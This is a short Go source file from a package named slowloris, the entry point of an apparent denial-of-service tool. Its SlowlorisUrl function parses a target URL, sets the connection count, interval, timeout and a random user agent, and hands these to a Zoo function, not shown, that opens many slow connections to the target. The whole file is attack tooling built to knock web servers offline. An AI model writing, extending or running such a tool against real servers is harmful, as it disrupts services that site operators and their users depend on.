package slowloris

import (
	"errors"
	"fmt"
	"net/url"
	"strings"
	"time"
)

func SlowlorisUrl(rawURL string, count int64, interval time.Duration, timeout time.Duration) error {
	if !strings.Contains(rawURL, "http") {
		err := errors.New("no scheme provided. use (http or https)")
		return err
	}
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return err
	}

	options := Options{
		URL:       parsed,
		UserAgent: "random",
		Secure:    parsed.Scheme == "https",
		Count:     count,
		Interval:  interval,
		Timeout:   timeout,
	}

	fmt.Println("slowloris...")
	fmt.Printf("creating zoo of %d loris for %s\n", count, rawURL)
	if err := Zoo(options); err != nil {
		return err
	}

	return nil
}
